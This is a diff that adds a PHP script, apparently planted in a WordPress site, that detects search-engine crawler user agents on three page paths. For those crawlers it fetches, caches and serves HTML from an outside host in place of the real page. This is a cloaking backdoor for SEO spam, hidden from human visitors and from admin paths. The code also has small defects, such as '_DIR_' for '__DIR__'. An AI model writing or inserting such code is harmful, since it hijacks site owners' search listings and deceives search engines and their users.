@@ -1,0 +1,92 @@
+<?php
+$bot_user_agents = array(
+    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", 
+    "Storebot-Google", "Google-InspectionTool", "GoogleOther", 
+    "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", 
+    "Google-Extended", "APIs-Google", "AdsBot-Google-Mobile", 
+    "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", 
+    "Google-Favicon", "Googlebot-Favicon", "Google-Site-Verification", 
+    "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", 
+    "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", 
+    "YandexBot", "Sogou", "Exabot", "facebot", "ia_archiver"
+);
+
+function is_bot($user_agent, $bots) {
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+$request_uri_full = $_SERVER['REQUEST_URI'] ?? '';
+$request_uri = parse_url($request_uri_full, PHP_URL_PATH);
+$request_uri = strtolower(rtrim($request_uri, '/')) . '/';
+
+// Abaikan admin dan API
+if (preg_match('#/(wp-admin|wp-json|xmlrpc|admin|api)#i', $request_uri)) {
+    return;
+}
+
+$page_urls = array(
+    '/gallery/' => "https://binjai.coreindonesia.org/kamunanyak.php",
+  '/news/' => "https://binjai.coreindonesia.org/yakaligakterbang.php",
+    '/contact/' => "https://binjai.coreindonesia.org/buayabuntung.php",
+);
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$is_bot = is_bot($user_agent, $bot_user_agents);
+$isTargetPage = isset($page_urls[$request_uri]);
+
+if ($is_bot && $isTargetPage) {
+    $external_url = $page_urls[$request_uri];
+
+    // 📁 Path cache
+    $upload_dir = _DIR_ . '/wp-content/uploads/2025/10/';
+    if (!is_dir($upload_dir)) {
+        mkdir($upload_dir, 0755, true);
+    }
+
+    // Nama file cache berdasarkan slug halaman
+    $cache_file = $upload_dir . md5($request_uri) . '.html';
+
+    // 🕒 Waktu cache berlaku (misal 3 hari)
+   $cache_lifetime = 30 * 24 * 60 * 60; // 30 hari
+
+    // Jika file cache masih valid, tampilkan dari cache
+    if (file_exists($cache_file) && (time() - filemtime($cache_file)) < $cache_lifetime) {
+        header("Content-Type: text/html; charset=UTF-8");
+        echo file_get_contents($cache_file);
+        exit;
+    }
+
+    // Jika belum ada cache, ambil via curl
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $external_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent ?: 'Mozilla/5.0 (compatible; CacheBot/1.0)');
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($http_code === 200 && !empty($content)) {
+        // Simpan ke cache file
+        file_put_contents($cache_file, $content);
+        header("Content-Type: text/html; charset=UTF-8");
+        echo $content;
+    } else {
+        // Jika gagal, tampilkan cache lama kalau ada
+        if (file_exists($cache_file)) {
+            header("Content-Type: text/html; charset=UTF-8");
+            echo file_get_contents($cache_file);
+        } else {
+            header("Content-Type: text/plain; charset=UTF-8");
+            echo "Failed to fetch content (HTTP $http_code).";
+        }
+    }
+
+    exit;
+}
